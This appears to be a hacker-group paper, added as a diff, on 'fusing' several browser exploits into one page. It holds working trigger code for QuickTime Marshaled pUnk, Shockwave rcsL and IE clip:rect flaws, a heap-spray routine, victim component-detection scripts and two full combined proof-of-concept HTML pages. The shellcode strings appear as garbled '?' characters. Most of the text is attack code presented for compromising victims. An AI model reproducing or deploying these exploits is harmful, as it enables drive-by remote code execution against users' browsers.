@@ -1,0 +1,371 @@
+                                                 **Fusion of Xploits - Multiplexing exploitation** 
+                                                 
+                                                   **RESEARCH TEAM: Legion Of XTRemers, India**
+                                                  
+                                                **SPECIAL GREETZ TO: SECFENCE TEAM AND GARAGE 4 HACKERS**
+
+
+The worthiness of a single chance to exploit a specific victim cannot be compared withanything else. And a hacker by hook-or-crook will never tend to loose even a little probability of such a chance. In such scenarios, normal exploitation strategies fail to cash-up such precious chances of exploitation. But, why normal exploitation fail? In kill-all type situation several exploits are bundled togather so as to achieve more chances of success of remote code execution. But in some cases we cannot infer what vulnerable products are loaded on target victim box.So in case of certain type of exploits; which need exclusive resources, one non-legitimate contender exploit will cause failure of the eligible exploit. Such a situation is mostly faced with heap spray type exploits. Though there are several other types also which behave in similar fashion.
+
+In this paper, we'll discus about the fusion of multiple heap spray based exploits in such a way that they will execute under same roof (shared resource among them).Some vulnerabilities, which gets trigerred by javascript and do not need any extra plugin or activeX component are simplest cases to get triggerred in sequence.But in case of fusion of exploits which use activeX components or plugins, we have to tackle few problems first
+before triggering the vulnerability.
+
+In this paper I am going to fuse Apple QuickTime Marshalled pUnk exploit and a zeroday of Adobe.
+
+Apple QuickTime Marshalled pUnk code:
+
+<script language=javascript>
+addr = 354552864; // 0x15220C20 [pUnk]
+var obj= '<' + 'object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0"'+'>'
++'<' + 'PARAM name="_Marshaled_pUnk" value="'+addr+'"' + '/>'
++'<'+'/'+'object>';
+document.write(obj);
+</script>
+
+
+And vulnerability trigger for Shockwave player rcsL chunk memory corruption:
+
+<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258"
+codebase="http://download.macromedia.com/pub/shockwave/cabs/director/sw.cab#version=11,5,0,593"
+ID=shockit width=600 height=430 VIEWASTEXT>
+<param name=src value="exploit.DIR">
+<param name=swRemote value="swSaveEnabled='true' swVolume='true' swRestart='true' swPausePlay='true' swFastForward='true' swContextMenu='true' ">
+<param name=swStretchStyle value=fill>
+<param name=PlayerVersion value=11>
+<PARAM NAME=bgColor VALUE=#FFFFFF>
+<embed src="exploit.DIR" bgColor=#FFFFFF width=600 height=430 swRemote="swSaveEnabled='true' swVolume='true' swRestart='true' swPausePlay='true' swFastForward='true' swContextMenu='true' " swStretchStyle=fill
+type="application/x-director" PlayerVersion=11 pluginspage="http://www.macromedia.com/shockwave/download/"></embed>
+</object>
+
+
+Note: Shockwave vulnerability needs a file exploit.DIR which is bundled with original exploit. Download it from: http://www.exploit-db.com/exploits/15296/
+
+
+And we'll use the following heap spray code for exploitation of these vulnerabilities:
+
+
+<script language=javascript>
+/*---------- Heap-Spray Circuit ------------*/
+var shellcode=unescape('Javascript Unicode Shellcode');
+block=unescape("%u0c0c?");
+headersize=20;
+space=headersize+shellcode.length;
+while(block.length<space) {
+block+=block;
+}
+suffixBlock=block.substring(0,space);
+blk=block.substring(0,block.length-space);
+while(blk.length+space<40000) {
+blk=blk+blk+suffixBlock;
+}
+arrBuffer=new Array();
+for(var i=0;i<800;i++) {
+arrBuffer[i]=blk+shellcode;
+}
+/*---------- Heap-Spray Circuit end------------*/
+</script>
+
+
+In case of fusion of multiple vulnerability triggers togather, we reduce the race condition among them and if first trigger will work properly and the exploitation goes on successfully, then the browser normally doesnt trigger the other triggers, because in most cases, the browser process silently gets defferred. This will reduce the race condition overhead among exploits.
+
+Typically, the pseudo structure of a fused exploit should be like this:
+
+[Heap Spray]
+[1st vulnerability trigger]
+[2nd vulnerability trigger]
+
+
+This will work if 1st vulnerability gets triggerred properly. But will fail if the object corresponding to 1st trigger will be absent, in this case, the garbage collector will run and the whole spray will vanish before triggering 2nd vulnerability. This situation is undesirable and will foil the exploitation attempt even if the 2nd vulnerability was itself capable of exploiting the target.
+
+In order to solve this problem, before triggering the vulnerability we must ensure that its correspondingcomponent is present in the target browser. So now, the above proposed fused exploit pseudo structure should be like this:
+
+variable go1 = false
+variable go2 = false
+if : [1st component present] -->go1 = true
+else if [2nd component present] -->go2 = true
+
+[Heap Spray]
+
+if [go1 == true] --> [1st vulnerability trigger]
+else if[go2 == true] --> [2nd vulnerability trigger]
+
+
+But how to know whether the particular component is present? HTML is a stateless language and doesn't help us in providing information whether a particular component is present or not in most cases.To overcome this hinderance, we should check by calling the component before the spray and then, checking
+the default values of its properties. In other cases, we should check by using the component in a proper way and then getting something processed by it and checking the processed output.
+
+In somecases the scripts can tell us whether a particular component is present or not. In case of Adobe Shockwave, we can check for example the src value of the shockwave component, if shockwave will be installed, then its value will be "" if not specified, and if shockwave will
+not be installed, in that case it's value will be "undefined", we can check it using following code:
+
+
+<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258" id="shockex" width=0 height=0> </object>
+<script language=javascript>
+var a=document.getElementById("shockex");
+document.write("shockex.src : "+shockex.src);
+</script>
+
+
+Whereas above technique doesnt work for Apple QuickTime's properties. But Following script can detect
+Apple QuickTime, this script is given on Apple QuickTime's forums:
+
+
+<script>
+var qcheck = false;
+</script>
+<script LANGUAGE="VBScript">
+Set qtObject = CreateObject("QuickTimeCheckObject.QuickTimeCheck. 1")
+If IsObject(qtObject) Then
+If qtObject.IsQuickTimeAvailable(0) Then
+qcheck = true
+End If
+End If
+</script>
+<script>
+document.write("<BR>quicktime : "+qcheck);
+</script>
+
+
+We can use these scriptlets to decide which vulnerabilities should be triggerred.
+By combining all these techniques, we can now construct the fusion exploit:
+
+
+<!---Fusion Exploit --->
+<!---*** Limit on vulnerability triggers : No Limit
+Developer : "vinnu"
+***--->
+<html>
+<head><title>Fusion Exploit POC </title></head>
+<body>
+<script>
+var qcheck = false;
+var scheck = false;
+</script>
+
+<!--------- Component detection circuit --------->
+<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258" id="shockex" width=0 height=0> </object>
+<script language=javascript>
+var a=document.getElementById("shockex");
+if (a.src=="")scheck=true;
+</script>
+
+<script LANGUAGE="VBScript">
+Set qtObject = CreateObject("QuickTimeCheckObject.QuickTimeCheck. 1")
+If IsObject(qtObject) Then
+If qtObject.IsQuickTimeAvailable(0) Then
+qcheck = true
+End If
+End If
+</script>
+<script language=javascript>
+document.write("<BR>quicktime : "+qcheck);
+document.write("<BR>shockex.src : "+shockex.src);
+document.write("<BR>Shockwave : "+scheck);
+</script>
+<!--------- Component detection circuit end --------->
+<script language=javascript>
+/*------ 1st vulnerable component --------*/
+addr = 202116108;// 0x0C0C0C0C [pUnk]
+var obj= '<' + 'object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0"'+'>'
++'<' + 'PARAM name="_Marshaled_pUnk" value="'+addr+'"' + '/>'
++'<'+'/'+'object>';
+/*------ 1st vulnerable component end --------*/
+/*------ 2nd vulnerable component --------*/
+sobj = '<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258"'
++ '\n codebase="http://download.macromedia.com/pub/shockwave/cabs/director/sw.cab#version=11,5,0,593"'
++ '\n ID=shockit width=600 height=430 VIEWASTEXT>'
++ '\n<param name=src value="exploit.DIR">'
++ '\n<param name=swRemote value="swSaveEnabled=\'true\' swVolume=\'true\' swRestart=\'true\' swPausePlay=\'true\' swFastForward=\'true\' swContextMenu=\'true\' ">'
++ '\n<param name=swStretchStyle value=fill>'
++ '\n<param name=PlayerVersion value=11>'
++ '\n<PARAM NAME=bgColor VALUE=#FFFFFF> '
++ '\n<embed src="exploit.DIR" bgColor=#FFFFFF width=600 height=430 swRemote="swSaveEnabled=\'true\' swVolume=\'true\' swRestart=\'true\' swPausePlay=\'true\' swFastForward=\'true\' swContextMenu=\'true\' " swStretchStyle=fill'
++ '\n type="application/x-director" PlayerVersion=11 pluginspage="http://www.macromedia.com/shockwave/download/"></embed>'
++ '\n</object>';
+/*------ 2nd vulnerable component end --------*/
+</script>
+
+<script>
+/*---------- Heap-Spray Circuit ------------*/
+/*--- executes calc.exe shellcode ---*/
+var i = 0,alimit = 800,slimit = 0x40000, uagent = navigator.userAgent;
+var arrBuffer=new Array();
+if(uagent.indexOf("MSIE 6.0")>=0) {
+alimit = 500;
+slimit = 0x24000;
+}
+var shellcode=unescape('???????????"?????????????????? ??????????°??????????????????????????????????????? ????????????????????????????????????');
+block=unescape("??");
+headersize=20;space=headersize+shellcode.length;
+while(block.length<space) {
+block+=block;
+}
+suffixBlock=block.substring(0,space);
+blk=block.substring(0,block.length-space);
+while(blk.length+space<slimit) {
+blk=blk+blk+suffixBlock;
+}
+for(i=0;i<alimit;i++) {
+arrBuffer[i]=blk+shellcode;
+}
+/*---------- Heap-Spray Circuit end------------*/
+</script>
+<script>
+/*---------vulnerability trigger circuit--------------*/
+if (qcheck == true)document.write(obj); /*---- 1st vulnerability trigger ----*/
+else if (scheck == true)document.write(sobj); /*---- 2nd vulnerability trigger ----*/
+/*-------vulnerability trigger circuit end------------*/
+</script>
+</body>
+</html>
+
+</--- Fusion Exploit End --->
+
+
+
+
+
+<-----------------------------------> 
+
+Spraying Spare Spray: In some cases the different exploits may need varying ammount of heap sprays. The best results can only be achieved if low ammount
+spray vulnerabilities triggerred first in increasing order of required ammount of spray. For examples a new zeroday of IE that requires high ammount of heap spray can also be fused with above exploit poc.
+
+Following is the trigger of new IE vulnerability for IE 6,7,8:
+
+
+document.write("<table style=position:absolute;clip:rect(0)>");
+
+
+But it needs more ammount of spray, so we can spray a little more just before triggering it. Following code will do enough spray for successfull code execution:
+
+
+<script language=javascript>
+for(;i<1500;i++) {
+arrBuffer[i]=blk+shellcode;
+}
+</script>
+
+
+
+And the code that needs to be implanted into above POC is:
+
+
+<script language=javascript>
+for(;i<1500;i++) {
+arrBuffer[i]=blk+shellcode;
+}
+document.write("<table style=position:absolute;clip:rect(0)>");
+</script>
+
+
+
+Now the Fusion exploit POC after including IE exploit too it becomes:
+
+
+
+<!---Fusion Exploit --->
+<!---*** Limit on vulnerability triggers : No Limit
+Developer : "vinnu"
+***--->
+<html>
+<head><title>Fusion Exploit POC </title></head>
+<body>
+<script>
+var qcheck = false;
+var scheck = false;
+</script>
+
+<!--------- Component detection circuit --------->
+<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258" id="shockex" width=0 height=0> </object>
+<script language=javascript>
+var a=document.getElementById("shockex");
+if (a.src=="")scheck=true;
+</script>
+
+<script LANGUAGE="VBScript">
+Set qtObject = CreateObject("QuickTimeCheckObject.QuickTimeCheck. 1")
+If IsObject(qtObject) Then
+If qtObject.IsQuickTimeAvailable(0) Then
+qcheck = true
+End If
+End If
+</script>
+<script language=javascript>
+document.write("<BR>quicktime : "+qcheck);
+document.write("<BR>shockex.src : "+shockex.src);
+document.write("<BR>Shockwave : "+scheck);
+</script>
+<!--------- Component detection circuit end --------->
+<script language=javascript>
+/*------ 1st vulnerable component --------*/
+addr = 202116108;// 0x0C0C0C0C [pUnk]
+var obj= '<' + 'object classid="clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B" width="0" height="0"'+'>'
++'<' + 'PARAM name="_Marshaled_pUnk" value="'+addr+'"' + '/>'
++'<'+'/'+'object>';
+/*------ 1st vulnerable component end --------*/
+/*------ 2nd vulnerable component --------*/
+sobj = '<object classid="clsid:233C1507-6A77-46A4-9443-F871F945D258"'
++ '\n codebase="http://download.macromedia.com/pub/shockwave/cabs/director/sw.cab#version=11,5,0,593"'
++ '\n ID=shockit width=600 height=430 VIEWASTEXT>'
++ '\n<param name=src value="exploit.DIR">'
++ '\n<param name=swRemote value="swSaveEnabled=\'true\' swVolume=\'true\' swRestart=\'true\' swPausePlay=\'true\' swFastForward=\'true\' swContextMenu=\'true\' ">'
++ '\n<param name=swStretchStyle value=fill>'
++ '\n<param name=PlayerVersion value=11>'
++ '\n<PARAM NAME=bgColor VALUE=#FFFFFF> '
++ '\n<embed src="exploit.DIR" bgColor=#FFFFFF width=600 height=430 swRemote="swSaveEnabled=\'true\' swVolume=\'true\' swRestart=\'true\' swPausePlay=\'true\' swFastForward=\'true\' swContextMenu=\'true\' " swStretchStyle=fill'
++ '\n type="application/x-director" PlayerVersion=11 pluginspage="http://www.macromedia.com/shockwave/download/"></embed>'
++ '\n</object>';
+/*------ 2nd vulnerable component end --------*/
+</script>
+
+<script>
+/*---------- Heap-Spray Circuit ------------*/
+/*--- executes calc.exe shellcode ---*/
+var i = 0,alimit = 800,slimit = 0x40000, uagent = navigator.userAgent;
+var arrBuffer=new Array();
+if(uagent.indexOf("MSIE 6.0")>=0) {
+alimit = 500;
+slimit = 0x24000;
+}
+var shellcode=unescape('%u9090??????????"????????????? ???????????????°?????????????????????????????????? ?????????????????????????????????????????');
+block=unescape("??");
+headersize=20;space=headersize+shellcode.length;
+while(block.length<space) {
+block+=block;
+}
+suffixBlock=block.substring(0,space);
+blk=block.substring(0,block.length-space);
+while(blk.length+space<slimit) {
+blk=blk+blk+suffixBlock;
+}
+for(i=0;i<alimit;i++) {
+arrBuffer[i]=blk+shellcode;
+}
+/*---------- Heap-Spray Circuit end------------*/
+</script>
+<script>
+/*---------vulnerability trigger circuit--------------*/
+if (qcheck == true)document.write(obj); /*---- 1st vulnerability trigger ----*/
+else if (scheck == true)document.write(sobj); /*---- 2nd vulnerability trigger ----*/
+/*-------vulnerability trigger circuit end------------*/
+</script>
+
+<script>
+/*------------IE exploit--------------*/
+// Tested on IE 6, If will fail in higher,
+// just increase a little the spray ammount.
+// Doesnt need any component detection code
+// as in quicktime or shockwave.
+
+for(;i<1500;i++) {
+arrBuffer[i]=blk+shellcode;
+}
+document.write("<table style=position:absolute;clip:rect(0)>");
+/*------------IE exploit end----------*/
+</script>
+
+
+</body>
+</html>
+
+</--- Fusion Exploit End ---> 
+
+
